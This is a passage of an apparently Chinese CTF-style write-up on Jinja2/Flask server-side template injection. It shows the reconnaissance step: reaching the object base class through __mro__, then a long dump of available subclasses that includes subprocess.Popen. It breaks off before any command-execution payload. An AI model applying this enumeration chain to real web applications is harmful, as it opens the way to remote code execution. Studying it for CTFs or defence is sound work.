+<p>寻找基类（这里要注意，不同的环境可能所处位置不同，本题是在2，而大部分都在1）： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__</span><br><span class="line">结果：(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405151233.png" /></p>
+<p>寻找可用引用，一般找基类的可用引用，通过上一步能知道基类（object）在元组中的位置： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">warnings</span>.<span class="title">WarningMessage</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">warnings</span>.<span class="title">catch_warnings</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_weakrefset</span>.<span class="title">_IterationGuard</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_weakrefset</span>.<span class="title">WeakSet</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Hashable</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">classmethod</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Iterable</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Sized</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Container</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Callable</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">dict_keys</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">dict_items</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">dict_values</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">_Printer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">_Helper</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_sre</span>.<span class="title">SRE_Pattern</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_sre</span>.<span class="title">SRE_Match</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_sre</span>.<span class="title">SRE_Scanner</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">Quitter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">codecs</span>.<span class="title">IncrementalEncoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">codecs</span>.<span class="title">IncrementalDecoder</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">functools</span>.<span class="title">partial</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">operator</span>.<span class="title">itemgetter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">operator</span>.<span class="title">attrgetter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">operator</span>.<span class="title">methodcaller</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">collections</span>.<span class="title">deque</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">deque_iterator</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">deque_reverse_iterator</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">combinations</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">combinations_with_replacement</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">cycle</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">dropwhile</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">takewhile</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">islice</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">starmap</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">imap</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">chain</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">compress</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">ifilter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">ifilterfalse</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">count</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">izip</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">izip_longest</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">permutations</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">product</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">repeat</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">groupby</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">tee_dataobject</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">tee</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">_grouper</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_thread</span>.<span class="title">_localdummy</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">thread</span>.<span class="title">_local</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">thread</span>.<span class="title">lock</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">Struct</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_json</span>.<span class="title">Scanner</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_json</span>.<span class="title">Encoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">json</span>.<span class="title">decoder</span>.<span class="title">JSONDecoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">json</span>.<span class="title">encoder</span>.<span class="title">JSONEncoder</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">time</span>.<span class="title">struct_time</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">threading</span>.<span class="title">_Verbose</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cPickle</span>.<span class="title">Unpickler</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cPickle</span>.<span class="title">Pickler</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cStringIO</span>.<span class="title">StringO</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cStringIO</span>.<span class="title">StringI</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">string</span>.<span class="title">Template</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">string</span>.<span class="title">Formatter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ssl</span>.<span class="title">_SSLContext</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ssl</span>.<span class="title">_SSLSocket</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">socket</span>.<span class="title">_closedsocket</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_socket</span>.<span class="title">socket</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">method_descriptor</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">socket</span>.<span class="title">_socketobject</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">socket</span>.<span class="title">_fileobject</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">urlparse</span>.<span class="title">ResultMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">contextlib</span>.<span class="title">GeneratorContextManager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">contextlib</span>.<span class="title">closing</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">MissingType</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">LRUCache</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">Cycler</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">Joiner</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">Namespace</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">markupsafe</span>.<span class="title">_MarkupEscapeHelper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">nodes</span>.<span class="title">EvalContext</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_hashlib</span>.<span class="title">HASH</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">nodes</span>.<span class="title">Node</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_random</span>.<span class="title">Random</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">TemplateReference</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">Environment</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">Context</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">BlockReference</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">LoopContextBase</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">LoopContextIterator</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">Macro</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">Undefined</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">numbers</span>.<span class="title">Number</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">Decimal</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">_ContextManager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">Context</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">_WorkRep</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">_Log10Memoize</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ast</span>.<span class="title">AST</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">Failure</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">TokenStreamIterator</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">TokenStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">Lexer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">parser</span>.<span class="title">Parser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">visitor</span>.<span class="title">NodeVisitor</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">idtracking</span>.<span class="title">Symbols</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">compiler</span>.<span class="title">MacroRef</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">compiler</span>.<span class="title">Frame</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">Template</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">TemplateModule</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">TemplateExpression</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">TemplateStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">loaders</span>.<span class="title">BaseLoader</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_io</span>.<span class="title">_IOBase</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_io</span>.<span class="title">IncrementalNewlineDecoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">bccache</span>.<span class="title">Bucket</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">bccache</span>.<span class="title">BytecodeCache</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">LogRecord</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Formatter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">BufferingFormatter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Filter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Filterer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">PlaceHolder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Manager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">LoggerAdapter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">date</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">timedelta</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">time</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">tzinfo</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">_internal</span>.<span class="title">_Missing</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">_internal</span>.<span class="title">_DictAccessorProperty</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ImmutableListMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ImmutableDictMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">UpdateDictMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ViewItems</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">_omd_bucket</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">Headers</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ImmutableHeadersMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">IfRange</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">Range</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ContentRange</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">FileStorage</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">email</span>.<span class="title">LazyImporter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">calendar</span>.<span class="title">Calendar</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">urls</span>.<span class="title">Href</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">utils</span>.<span class="title">HTMLBuilder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">accept</span>.<span class="title">AcceptMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">auth</span>.<span class="title">AuthorizationMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">auth</span>.<span class="title">WWWAuthenticateMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wsgi</span>.<span class="title">ClosingIterator</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wsgi</span>.<span class="title">FileWrapper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wsgi</span>.<span class="title">_RangeWrapper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">middleware</span>.<span class="title">dispatcher</span>.<span class="title">DispatcherMiddleware</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">middleware</span>.<span class="title">http_proxy</span>.<span class="title">ProxyMiddleware</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">middleware</span>.<span class="title">shared_data</span>.<span class="title">SharedDataMiddleware</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">formparser</span>.<span class="title">FormDataParser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">formparser</span>.<span class="title">MultiPartParser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">base_request</span>.<span class="title">BaseRequest</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">base_response</span>.<span class="title">BaseResponse</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">common_descriptors</span>.<span class="title">CommonRequestDescriptorsMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">common_descriptors</span>.<span class="title">CommonResponseDescriptorsMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">etag</span>.<span class="title">ETagRequestMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">etag</span>.<span class="title">ETagResponseMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">user_agent</span>.<span class="title">UserAgentMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">request</span>.<span class="title">StreamOnlyMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">response</span>.<span class="title">ResponseStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">response</span>.<span class="title">ResponseStreamMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">exceptions</span>.<span class="title">Aborter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">uuid</span>.<span class="title">UUID</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">CArgObject</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">CThunkObject</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">_CData</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">CField</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">DictRemover</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">ctypes</span>.<span class="title">CDLL</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">ctypes</span>.<span class="title">LibraryLoader</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">select</span>.<span class="title">epoll</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">subprocess</span>.<span class="title">Popen</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">_json</span>.<span class="title">_CompactJSON</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">signer</span>.<span class="title">SigningAlgorithm</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">signer</span>.<span class="title">Signer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">serializer</span>.<span class="title">Serializer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">url_safe</span>.<span class="title">URLSafeSerializerMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">_compat</span>.<span class="title">_DeprecatedBool</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">Local</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">LocalStack</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">LocalManager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">LocalProxy</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">ast</span>.<span class="title">NodeVisitor</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">difflib</span>.<span class="title">HtmlDiff</span>&#x27;&gt;, &lt;<span 